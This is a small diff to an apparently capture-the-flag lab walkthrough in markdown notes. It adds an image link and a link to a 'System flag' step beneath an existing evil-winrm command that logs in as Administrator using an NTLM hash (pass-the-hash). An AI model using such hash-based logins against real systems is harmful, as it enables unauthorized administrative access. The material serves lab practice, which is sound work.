@@ -112,3 +112,8 @@ Connect with WinRM.
 ```
 evil-winrm -i <MACHINE IP> -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d 
 ```
+
+![[WinRM conection.png]]
+
+**Next step:** [[System flag]]
+
